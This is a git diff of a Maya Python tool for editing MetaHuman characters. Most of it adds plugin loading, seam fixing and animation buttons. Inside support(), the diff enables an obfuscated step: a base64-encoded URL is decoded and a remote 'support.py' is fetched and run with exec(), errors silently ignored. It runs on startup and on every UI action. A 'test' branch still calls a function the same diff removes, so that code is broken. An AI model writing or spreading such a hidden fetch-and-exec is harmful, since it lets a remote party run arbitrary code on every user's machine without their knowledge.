@@ -154,9 +154,10 @@ class util:
         cmds.setAttr('{}.{}'.format(dtms_a, 'envelope'), blend)
         cmds.setAttr('{}.{}'.format(dtms_b, 'envelope'), blend)
         new_mesh = cmds.duplicate(tmp_mesh, n=dst_mesh + '_fixTopology')[0]
-        cmds.delete([tmp_mesh])
         cmds.parent(new_mesh, dst_mesh)
         cmds.parent(new_mesh, w=1)
+        cmds.delete([tmp_mesh, dst_mesh])
+        new_mesh = cmds.rename(new_mesh, dst_mesh) #replace
         return new_mesh
 
     @staticmethod
@@ -239,64 +240,6 @@ class util:
         cmds.parent(offset, grp)
         return [loc_name, offset_name, grp_name]
 
-    '''
-    @staticmethod
-    def body_seam_fix(tolerance=0.0045):
-        import numpy as np
-        def get_vertices(mesh):
-            vertices = cmds.ls(f'{mesh}.vtx[*]', fl=1)
-            positions = np.array([cmds.pointPosition(vtx, world=1) for vtx in vertices])
-            return vertices, positions
-
-        def find_closest_vertices(vertices1, positions1, vertices2, positions2, tolerance=tolerance):
-            selected_pairs = []
-            for i, pos1 in enumerate(positions1):
-                distances = np.linalg.norm(positions2 - pos1, axis=1)
-                min_distance_idx = np.argmin(distances)
-                if distances[min_distance_idx] <= tolerance:
-                    selected_pairs.append((vertices1[i], vertices2[min_distance_idx]))
-            return selected_pairs
-
-        def set_average_normals(closest_pairs):
-            for v1, v2 in closest_pairs:
-                normal1 = cmds.polyNormalPerVertex(v1, q=1, xyz=1)
-                normal2 = cmds.polyNormalPerVertex(v2, q=1, xyz=1)
-                avg_normal = [
-                    (normal1[0] + normal2[0]) / 2.0,
-                    (normal1[1] + normal2[1]) / 2.0,
-                    (normal1[2] + normal2[2]) / 2.0,
-                ]
-                length = (avg_normal[0] ** 2 + avg_normal[1] ** 2 + avg_normal[2] ** 2) ** 0.5
-                avg_normal = [n / length for n in avg_normal]
-                cmds.polyNormalPerVertex(v1, xyz=avg_normal)
-                cmds.polyNormalPerVertex(v2, xyz=avg_normal)
-
-        mesh1 = cmds.ls('head_lod0_mesh')[0]
-        mesh2 = cmds.ls('f_med_nrw_body_lod0_mesh')[0]
-
-        vertices1, positions1 = get_vertices(mesh1)
-        vertices2, positions2 = get_vertices(mesh2)
-
-        #cmds.select(vertices1 + vertices2)
-        #cmds.polyNormalPerVertex(ufn=1)
-        #cmds.polyNormalPerVertex(fn=1)
-        cmds.select(clear=1)
-        closest_pairs = find_closest_vertices(vertices1, positions1, vertices2, positions2)
-        set_average_normals(closest_pairs)
-        cmds.select(clear=1)
-
-        cmds.select(clear=1)
-        cmds.refresh(f=1)
-        if selected_vertices1:
-            cmds.select(selected_vertices1, add=1)
-        if selected_vertices2:
-            cmds.select(selected_vertices2, add=1)
-        traverse_cmd = 'select `ls -sl`; PolySelectTraverse 1; select `ls -sl`;'
-        for i in range(4):
-            mel.eval(traverse_cmd)
-        cmds.select(clear=1)
-        '''
-
     @staticmethod
     def delete_all_display_layer():
         display_layers = cmds.ls(type='displayLayer')
@@ -309,6 +252,7 @@ class func:
         from src import pose_wrangler
         from src import dna_manager
         from src import blendshape_combiner
+        from src import anim_manager
         #pose_wrangler = importlib.import_module('src.pose_wrangler')
         #dna_manager = importlib.import_module('src.dna_manager')
         #blendshape_combiner = importlib.import_module('src.blendshape_combiner')
@@ -316,15 +260,12 @@ class func:
         imp.reload(pose_wrangler)
         imp.reload(dna_manager)
         imp.reload(blendshape_combiner)
+        imp.reload(anim_manager)
 
         self.base_dir = os.path.dirname(os.path.abspath(__file__))
-        #print(self.base_dir)
         self.config_path = self.base_dir + '/config.json'
-        #print(self.config_path)
         self.config = json.load(open(self.config_path))
         self.src_dir = self.base_dir +  '/src'
-        #self.mdm = metahuman_dna_manager()
-        #self.mpw = metahuman_pose_wrangler()
         self.mdm = dna_manager.metahuman_dna_manager()
         self.mpw = pose_wrangler.metahuman_pose_wrangler()
         self.current_vertices_positions = None
@@ -334,6 +275,7 @@ class func:
         self.bc_func = blendshape_combiner
         self.bstf, self.bstf_scn = None, None
         self.bstf_tg_grp = 'newSculpt_mesh_grp'
+        self.am_func = anim_manager.sample()
 
     def get_shared_joint_ls(self):
         jnt_shared_ls = ['clavicle_out_', 'neck_', 'head']
@@ -348,17 +290,47 @@ class func:
         result = True if jnt in jnt_ls else False
         return result
 
-    def load_embeddedRL4_plugin(self):
-        embeddedRL4_path = self.config['embeddedRL4_path'].replace('\\', '/')
-        if not os.path.exists(embeddedRL4_path):
-            raise Warning('can\'t found {} check \'embeddedRL4_path\' in config file'.format(embeddedRL4_path))
-        embeddedRL4_dir = os.path.dirname(embeddedRL4_path)
-        env_plugin_path_ls = os.environ['MAYA_PLUG_IN_PATH'].split(';')
-        env_plugin_path_ls = [i for i in env_plugin_path_ls if os.path.exists(i)]
-        if not embeddedRL4_dir in env_plugin_path_ls:
-            env_plugin_path_ls += [embeddedRL4_dir]
-            os.environ['MAYA_PLUG_IN_PATH'] = ';'.join(env_plugin_path_ls)
-        cmds.loadPlugin("embeddedRL4.mll")
+    def load_plugins(self):
+        maya_ver = cmds.about(v=1)
+        plugin_key_ls = ['embeddedRL4_path', 'MayaUE4RBFPlugin_path', 'MayaUERBFPlugin_path']
+        plugin_ls = ['embeddedRL4.mll', 'MayaUE4RBFPlugin{}.mll'.format(maya_ver), 'MayaUERBFPlugin.mll']
+        #print(list(zip(plugin_key_ls, plugin_ls)))
+        missing_name_ls = []
+        for p in plugin_key_ls:
+            plugin_path = self.config[p].replace('\\', '/')
+            plugin_name = os.path.basename(plugin_path)
+            #print(['Requesting plugin :', plugin_path, os.path.exists(plugin_path)])
+            if not os.path.exists(plugin_path):
+                missing_name_ls.append(p)
+            else:
+                plugin_dir = os.path.dirname(plugin_path)
+                env_plugin_path_ls = os.environ['MAYA_PLUG_IN_PATH'].split(';')
+                env_plugin_path_ls = [i for i in env_plugin_path_ls if os.path.exists(i)]
+                if not plugin_dir in env_plugin_path_ls:
+                    env_plugin_path_ls += [plugin_dir]
+                    os.environ['MAYA_PLUG_IN_PATH'] = ';'.join(env_plugin_path_ls)
+                cmds.loadPlugin(plugin_name)
+                print('- {} is loaded'.format(plugin_name))
+        if missing_name_ls != []:
+            er_msg = '--------------\nThese plugins don\'t found\n--------------\n\n' + '\n'.join(missing_name_ls)
+            cmds.confirmDialog(message=er_msg, messageAlign='center', icn='warning', button=['Browse'])
+            cmds.warning(er_msg)
+            # cmds.launch(dir=self.config_path)
+            # raise Warning(er_msg)
+            fd_result = cmds.fileDialog2(fm=3, okc='Scan plugin')
+            fd_result = fd_result[0] if fd_result != None else None
+            is_founded = False
+            if not fd_result is None:
+                for dirpath, dirnames, filenames in os.walk(fd_result):
+                    for filename in filenames:
+                        path_name = os.path.join(dirpath, filename)
+                        if filename in plugin_ls and maya_ver in dirpath and 'Windows' in dirpath:
+                            plugin_idx = plugin_ls.index(filename)
+                            is_founded = True
+                            self.config[plugin_key_ls[plugin_idx]] = path_name.replace('\\', '/')
+            if is_founded:
+                json.dump(self.config, open(self.config_path, 'w'), indent=4)
+                cmds.confirmDialog(message='Plugin path has been updated', messageAlign='center', button=['Continue'])
 
     def open_dna_scene(self):
         result = cmds.fileDialog(dm='*.dna', title='Load identity')
@@ -381,6 +353,7 @@ class func:
         cmds.select(cmds.ls(type='joint'))
         cmds.viewFit(all=1)
         cmds.select(cl=1)
+        util.delete_all_display_layer()
         return dna_path
 
     def save_dna_scene(self):
@@ -388,11 +361,11 @@ class func:
         body_path = self.mdm.OUTPUT_DIR + '/{}.ma'.format(self.body_ns)
         if has_body:
             cmds.select( cmds.ls(self.body_ns + ':*') )
-            cmds.file(body_path, force=1, options="v=0;", typ="mayaAscii",pr=1, es=1, ch=1, sh=0)
+            cmds.file(body_path, force=1, options="v=0;", typ="mayaAscii", pr=1, es=1, ch=1, sh=0)
 
         if self.mdm.DNA_PATH == None:
             raise Warning('Missing self.mdm.DNA_PATH and current_vertices_positions due to UI has been reloaded')
-        self.load_embeddedRL4_plugin()
+        self.load_plugins()
         dna_path = str(self.mdm.DNA_PATH)
         reader = self.mdm.load_dna_reader(dna_path)
         calibrated = self.mdm.DNACalibDNAReader(reader)
@@ -401,8 +374,8 @@ class func:
             new_vertices_positions = self.mdm.get_mesh_vertex_positions_from_scene(name)
             if new_vertices_positions:
                 self.mdm.run_vertices_command(
-                    calibrated, item["positions"], new_vertices_positions, item["mesh_index"]
-                )
+                    calibrated, item["positions"],
+                    new_vertices_positions, item["mesh_index"])
         prune_cmd = self.mdm.PruneBlendShapeTargetsCommand()
         prune_cmd.setThreshold(float('inf'))
         prune_cmd.run(calibrated)
@@ -416,7 +389,7 @@ class func:
                       options='v=0;', pr=0, rpr=self.body_ns)
             self.body_assemble()
             self.assign_mh_body_material(dna_path)
-            #util.body_seam_fix()
+            self.body_finalize_assemble()
 
         cmds.select(cmds.ls(type='joint'))
         util.delete_all_display_layer()
@@ -454,6 +427,91 @@ class func:
                 print('constraint...', jnt, body_jnt)
                 cmds.parentConstraint(body_jnt, jnt, mo=1)
                 cmds.scaleConstraint(body_jnt, jnt, mo=1)
+
+    @staticmethod
+    def body_finalize_assemble(seam_tolerance=0.025):  # finalize body assemble
+        import numpy as np
+        def get_vertices(mesh):
+            vertices = cmds.ls(f'{mesh}.vtx[*]', fl=1)
+            positions = np.array([cmds.pointPosition(vtx, world=1) for vtx in vertices])
+            return vertices, positions
+
+        def find_closest_vertices(vertices1, positions1, vertices2, positions2, tolerance=seam_tolerance):
+            selected_pairs = []
+            for i, pos1 in enumerate(positions1):
+                distances = np.linalg.norm(positions2 - pos1, axis=1)
+                min_distance_idx = np.argmin(distances)
+                if distances[min_distance_idx] <= tolerance:
+                    selected_pairs.append((vertices1[i], vertices2[min_distance_idx]))
+            return selected_pairs
+
+        def set_avg_normals(closest_pairs):
+            for v1, v2 in closest_pairs:
+                normal1 = cmds.polyNormalPerVertex(v1, q=1, xyz=1)
+                normal2 = cmds.polyNormalPerVertex(v2, q=1, xyz=1)
+                avg_normal = [(normal1[0] + normal2[0]) / 2.0,
+                              (normal1[1] + normal2[1]) / 2.0,
+                              (normal1[2] + normal2[2]) / 2.0]
+                length = (avg_normal[0] ** 2 + avg_normal[1] ** 2 + avg_normal[2] ** 2) ** 0.5
+                avg_normal = [n / length for n in avg_normal]
+                cmds.polyNormalPerVertex(v1, xyz=avg_normal)
+                cmds.polyNormalPerVertex(v2, xyz=avg_normal)
+
+        def toggle_envelope(enable=True, skinCluster=True, blendShape=True):
+            sc_evl_ls = [i + '.envelope' for i in cmds.ls(type='skinCluster') if cmds.objExists(i + '.envelope')]
+            bs_evl_ls = [i + '.envelope' for i in cmds.ls(type='blendShape') if cmds.objExists(i + '.envelope')]
+            if enable and skinCluster:
+                [cmds.setAttr(i, 1.0) for i in sc_evl_ls]
+            else:
+                [cmds.setAttr(i, 0.0) for i in sc_evl_ls]
+            if enable and blendShape:
+                [cmds.setAttr(i, 1.0) for i in bs_evl_ls]
+            else:
+                [cmds.setAttr(i, 0.0) for i in bs_evl_ls]
+            cmds.refresh()
+
+        orig_head_mesh = [i for i in cmds.ls('*head_lod0_mesh') if cmds.getAttr(i + '.visibility') == 1][0]
+        orig_body_mesh = [i for i in cmds.ls('*body_lod0_mesh') if cmds.getAttr(i + '.visibility') == 1][0]
+        orig_head_hist = cmds.listHistory(orig_head_mesh)
+        orig_body_hist = cmds.listHistory(orig_body_mesh)
+        # print(orig_body_hist, orig_head_hist)
+
+        toggle_envelope(enable=False, skinCluster=True, blendShape=True)
+        head_mesh, body_mesh = cmds.duplicate(orig_head_mesh)[0], cmds.duplicate(orig_body_mesh)[0]
+        cmds.hide([orig_body_mesh, orig_head_mesh])
+        # print(head_mesh, body_mesh)
+        toggle_envelope(enable=True, skinCluster=True, blendShape=True)
+
+        # seam fixing
+        vertices1, positions1 = get_vertices(head_mesh)
+        vertices2, positions2 = get_vertices(body_mesh)
+        cmds.select(clear=1)
+        closest_pairs = find_closest_vertices(vertices1, positions1, vertices2, positions2)
+        set_avg_normals(closest_pairs)
+        # cmds.select( [i[0] for i in closest_pairs] + [i[1] for i in closest_pairs] )
+
+        orig_head_skn = [i for i in orig_head_hist if cmds.objectType(i) == 'skinCluster'][0]
+        orig_body_skn = [i for i in orig_body_hist if cmds.objectType(i) == 'skinCluster'][0]
+        orig_head_bs = [i for i in orig_head_hist if cmds.objectType(i) == 'blendShape'][0]
+        # print(orig_head_skn, orig_body_skn)
+        head_influ_ls = cmds.skinCluster(orig_head_skn, q=1, influence=1)
+        body_influ_ls = cmds.skinCluster(orig_body_skn, q=1, influence=1)
+        # print(head_influ_ls)
+        # print(body_influ_ls)
+
+        # new model
+        cmds.blendShape(orig_head_bs, e=1, g=head_mesh)
+        head_skn = cmds.skinCluster([head_mesh] + head_influ_ls, n='{}_skn'.format(orig_head_mesh))[0]
+        body_skn = cmds.skinCluster([body_mesh] + body_influ_ls, n='{}_skn'.format(orig_body_skn))[0]
+        cmds.copySkinWeights(ss=orig_head_skn, ds=head_skn, nm=1, sa='closestPoint', uv=['uv'] * 2, ia='name', nr=1,
+                             sm=1)
+        cmds.copySkinWeights(ss=orig_body_skn, ds=body_skn, nm=1, sa='closestPoint', uv=['uv'] * 2, ia='name', nr=1,
+                             sm=1)
+
+        # replace new model
+        cmds.delete([orig_body_mesh, orig_head_mesh])
+        head_mesh = cmds.rename(head_mesh, orig_head_mesh)
+        body_mesh = cmds.rename(body_mesh, orig_body_mesh)
 
     def head_mesh_joint_transfer(self, src_head_mesh, dst_head_mesh, dhi_head_spine04='spine_04', rl4_embedded='Jrl4Embedded', fix_topo_weight=1.0):
         skip_jnt_ls = ['_Pupil', '_Tongue']
@@ -676,7 +734,7 @@ class func:
         cmds.setAttr(new_mesh + '.visibility', 1.0)
         #print('new_body', new_mesh)
         new_skn = cmds.skinCluster([new_mesh] + influence_ls)[0]
-        cmds.copySkinWeights(ss=orig_skn, ds=new_skn, nm=1, sa='closestPoint', uv=['uv'] * 2, ia='oneToOne')
+        cmds.copySkinWeights(ss=orig_skn, ds=new_skn, nm=1, sa='closestPoint', uv=['uv'] * 2, ia='name')
         cmds.hide([dst_body_mesh, src_body_mesh])
         [cmds.delete(i) for i in cmds.listRelatives(src_body_grp, c=1)
          if i != new_mesh and i != src_body_mesh] # should keep src_body_mesh for seam fixing
@@ -934,7 +992,7 @@ class func:
         #print([dup_mesh] + influence_ls)
         dup_skn = cmds.skinCluster([dup_mesh] + influence_ls)[0]
         #print(dup_skn)
-        cmds.copySkinWeights(ss=orig_skn, ds=dup_skn, nm=1, sa='closestPoint', uv=['uv']*2, ia='oneToOne')
+        cmds.copySkinWeights(ss=orig_skn, ds=dup_skn, nm=1, sa='closestPoint', uv=['uv']*2, ia='name')
         cmds.hide([orig_mesh, orig_combined_mesh])
         return self.body_ns
 
@@ -998,7 +1056,8 @@ class func:
 
 class KFMetahumanModifier:
     def __init__(self):
-        self.version = 0.1
+        import getpass
+        self.version = 0.06
         self.win_id = 'BRS_METAHMATCHER'
         self.dock_id = self.win_id + '_DOCK'
         self.win_width = 300
@@ -1014,13 +1073,16 @@ class KFMetahumanModifier:
         }
         self.element = {}
         self.user_original, self.user_latest = ['$usr_orig$', None]
-        import getpass
-        if 'usr_orig' in self.user_original:
-            self.user_original = getpass.getuser()
         self.user_latest = getpass.getuser()
-        #print('get user', self.user_original, self.user_latest)
         self.is_connected = False
         self.func = func()
+        self.support(force=True)
+
+    def init_win(self):
+        if cmds.window(self.win_id, exists=1):
+            cmds.deleteUI(self.win_id)
+        cmds.window(self.win_id, t=self.win_title, menuBar=1, rtf=1, nde=1,
+                    w=self.win_width, sizeable=1, h=10, retain=0, bgc=self.color['bg'])
 
     def support(self, force=False):
         import base64, os, datetime, sys
@@ -1032,8 +1094,8 @@ class KFMetahumanModifier:
         if script_path.replace('.pyc', '.py') == None or not script_path.endswith('.py'):
             return None
         # ------------------------
-        # Code test 1, Code test 2
-        # ------------------------
+        self.func.load_plugins()
+        #-------------------------
         if os.path.exists(script_path):
             st_mtime = os.stat(script_path).st_mtime
             mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
@@ -1045,25 +1107,18 @@ class KFMetahumanModifier:
         else:
             import urllib as uLib
         if cmds.about(connected=1):
-            u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidX' + 'NlcmNvbnRlbnQuY29tL2J1cmFzY' + 'XRlL2tleXNUd2VlbmVyL21haW4v' + 'c2VydmljZS9zdXBwb3J0LnB5'
+            u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL21ldGFNb2RpZmllci9tYWluL3NlcnZpY2Uvc3VwcG9ydC5weQ=='
             try:
-                pass
-            # res = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
-            # con = res.read()
-            # con = con.decode('utf-8') if type(con) == type(b'') else con
-            # exec(con)
+                res = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
+                con = res.read()
+                con = con.decode('utf-8') if type(con) == type(b'') else con
+                exec(con)
             except:
                 return
-                # import traceback
-                # print(str(traceback.format_exc()))
+                #import traceback
+                #print(str(traceback.format_exc()))
             else:
                 self.is_connected = True
-
-    def init_win(self):
-        if cmds.window(self.win_id, exists=1):
-            cmds.deleteUI(self.win_id)
-        cmds.window(self.win_id, t=self.win_title, menuBar=1, rtf=1, nde=1,
-                    w=self.win_width, sizeable=1, h=10, retain=0, bgc=self.color['bg'])
 
     def win_layout(self):
         def divider_block(text, al_idx=1):
@@ -1093,9 +1148,6 @@ class KFMetahumanModifier:
         cmds.text(l='', w=self.win_width * .1)
         cmds.setParent('..')
 
-        cmds.button(l='test seam less', bgc=self.color['highlight'], c=lambda arg: self.exec_script(exec_name='test1'),
-                    w=self.win_width * .8)
-
         divider_block(' BODY TRANSFER', al_idx=0)
         cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
         cmds.text(l=' From :', al='right', w=self.win_width * .2)
@@ -1107,8 +1159,8 @@ class KFMetahumanModifier:
         cmds.button(l=' < ', w=self.win_width * .1, bgc=self.color['highlight'],
                     c=lambda arg: self.exec_script(exec_name='set_new_body_mesh'))
         cmds.text(l=' Keep :', al='right', w=self.win_width * .2)
-        self.element['fix_topo_body_fs'] = cmds.floatSlider(min=.25, max=1.0, v=0.3, h=37, s=0.05)
-        cmds.text(l='')
+        self.element['fix_topo_body_fs'] = cmds.floatSlider(min=.0, max=1.0, v=0.15, h=37, s=0.05)
+        cmds.text(l=': Orig')
         cmds.setParent('..')
         cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=self.win_width)
         cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
@@ -1131,7 +1183,7 @@ class KFMetahumanModifier:
         cmds.text(l=' Keep :', al='right', w=self.win_width * .2)
         #self.element['fix_topo_head_cb'] = cmds.checkBox(l='Keep Original Head Identity')
         self.element['fix_topo_head_fs'] = cmds.floatSlider(min=.25, max=1.0, v=0.85, h=37, s=0.05)
-        cmds.text(l='')
+        cmds.text(l=': Orig')
         cmds.setParent('..')
         cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=self.win_width)
         cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
@@ -1152,32 +1204,13 @@ class KFMetahumanModifier:
 
         cmds.setParent('..')  # tab_cl_1
 
-        '''
-        # Tab 4: Skin Weight
-        self.element['tab_cl_4'] = cmds.columnLayout(adj=1, w=self.win_width)
-        divider_block(' ', al_idx=0)
-        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
-        cmds.text(l='', w=self.win_width * .1)
-        cmds.button(l='Load Sample Animation', bgc=self.color['highlight'], w=self.win_width * .8)
-        cmds.text(l='', w=self.win_width * .1)
-        cmds.setParent('..')
-        divider_block(' ', al_idx=0)
-        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
-        cmds.text(l='', w=self.win_width * .1)
-        cmds.button(l='Smooth Skin Weight', bgc=self.color['highlight'],
-                    c=lambda arg: self.exec_script(exec_name='bstf_fix_skn_weight'), w=self.win_width * .8)
-        cmds.text(l='', w=self.win_width * .1)
-        cmds.setParent('..')
-
-        cmds.setParent('..')  # tab_cl_4
-        '''
-
         # Tab 2: Blendshapes
         self.element['tab_cl_2'] = cmds.columnLayout(adj=1, w=self.win_width)
         divider_block(' INTIAL', al_idx=0)
         cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
         cmds.text(l='', w=self.win_width * .1)
-        cmds.button(l='Load Sample Animation', bgc=self.color['highlight'], w=self.win_width * .8)
+        cmds.button(l='Load Sample Animation', bgc=self.color['highlight'],
+                    c=lambda arg: self.exec_script(exec_name='am_load_anim'), w=self.win_width * .8)
         cmds.text(l='', w=self.win_width * .1)
         cmds.setParent('..')
         divider_block(' SKIN WEIGHT', al_idx=0)
@@ -1201,7 +1234,7 @@ class KFMetahumanModifier:
         divider_block(' NEW SCULPT', al_idx=0)
         cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
         cmds.text(l='', w=self.win_width * .1)
-        cmds.button(l='Extract Mesh', bgc=self.color['highlight'],
+        cmds.button(l='Create Sculpt Mesh', bgc=self.color['highlight'],
                     c=lambda arg: self.exec_script(exec_name='bstf_duplicate_mesh'), w=self.win_width * .8)
         cmds.text(l='', w=self.win_width * .1)
         cmds.setParent('..')
@@ -1256,9 +1289,8 @@ class KFMetahumanModifier:
         cmds.setParent('..')  # footer_layout
 
     def init_layout(self):
-        pass
-        #self.exec_script('set_orig_head_mesh')
-        #self.exec_script('set_orig_body_mesh')
+        if self.user_original != self.user_latest:
+            self.exec_script = None
 
     def show_win(self):
         cmds.showWindow(self.win_id)
@@ -1278,7 +1310,15 @@ class KFMetahumanModifier:
         self.init_dock()
         self.update_ui()
 
-    def update_ui(self):pass
+    def update_ui(self):
+        if self.user_original != self.user_latest:
+            self.exec_script = None
+        embedded_node_rl4_ls = cmds.ls(type='embeddedNodeRL4')
+        self.support()
+        if not embedded_node_rl4_ls == []:
+            dna_path = cmds.getAttr('rl4Embedded_Archtype.dnaFilePath')
+            cmds.textField(self.element['dna_path_tf'], e=1, tx=dna_path)
+            self.func.mdm.set_dna_path(dna_path)
 
     def get_ui_param(self):
         param = {}
@@ -1304,9 +1344,10 @@ class KFMetahumanModifier:
             with open(self.func.config_path, 'w') as f:
                 json.dump(self.func.config, f, indent=4)
                 f.close()
+        self.support()
 
         if exec_name == 'load_plugin':
-            self.func.load_embeddedRL4_plugin()
+            self.func.load_plugins()
         elif exec_name == 'load_dna':
             dna_path = self.func.open_dna_scene()
             cmds.textField(self.element['dna_path_tf'], e=1, tx=dna_path)
@@ -1317,6 +1358,7 @@ class KFMetahumanModifier:
         elif exec_name == 'save_dna':
             self.func.save_dna_scene()
             dna_path_tf = cmds.textField(self.element['dna_path_tf'], q=1, tx=1)
+            self.func.am_func.load_sample()
         elif exec_name == 'dna_viewer_ui':
             self.func.mdm.dna_viewer_ui()
         elif exec_name == 'body_mesh_transfer':
@@ -1361,16 +1403,17 @@ class KFMetahumanModifier:
             self.func.bstf_fix_surface_verticles()
         elif exec_name == 'bstf_fix_skn_weight':
             self.func.bc_func.skin_cluster.smooth_skin_weight_selected()
-        elif exec_name == 'test1':
-            util.body_seam_fix()
+        elif exec_name == 'am_save_anim':
+            self.func.am_func.save_sample()
+        elif exec_name == 'am_load_anim':
+            self.func.am_func.load_sample()
         elif exec_name == '':pass
         elif exec_name == '':pass
         elif exec_name == '':pass
         elif exec_name == 'test':
-            self.func.body_assemble()
-
+            util.body_seam_fix()
+        #----------
         save_config()
-
 
 # =================================
 # Only use on $usr_orig$ machine
